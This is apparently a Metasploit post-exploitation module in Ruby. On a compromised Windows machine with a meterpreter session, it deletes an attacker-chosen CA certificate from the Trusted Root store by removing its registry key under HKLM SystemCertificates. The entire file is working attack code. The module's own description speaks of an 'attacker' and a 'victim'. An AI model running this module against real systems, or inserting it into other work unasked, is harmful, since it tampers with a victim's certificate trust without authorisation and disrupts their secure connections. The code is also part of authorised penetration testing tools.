##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Manage Certificate Authority Removal',
      'Description'   => %q{
        This module allows the attacker to remove an arbitrary CA certificate
        from the victim's Trusted Root store.},
      'License'       => BSD_LICENSE,
      'Author'        => [ 'vt <nick.freeman[at]security-assessment.com>'],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))

    register_options(
      [
        OptString.new('CERTID', [ true, 'SHA1 hash of the certificate to remove.', '']),
      ])
  end


  def run
    certtoremove = datastore['CERTID']

    open_key = nil
    key = "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\SystemCertificates\\ROOT\\Certificates"
    rkey,bkey = client.sys.registry.splitkey(key)

    # Check if the requested cert is actually in the registry to start with
    open_key = client.sys.registry.open_key(rkey, bkey, KEY_READ + 0x0000)
    keys = open_key.enum_key

    if (keys.length > 1)
      if (keys.include?(certtoremove))
        # We found our target
      else
        print_error("The specified CA is not in the registry.")
        return
      end
    else
      print_error("These are not the CAs you are looking for (i.e. this registry branch is empty)")
    end

    open_key = client.sys.registry.open_key(rkey, bkey, KEY_WRITE + 0x0000)
    open_key.delete_key(certtoremove)
    print_good("Successfully deleted CA: #{certtoremove}")
  end
end
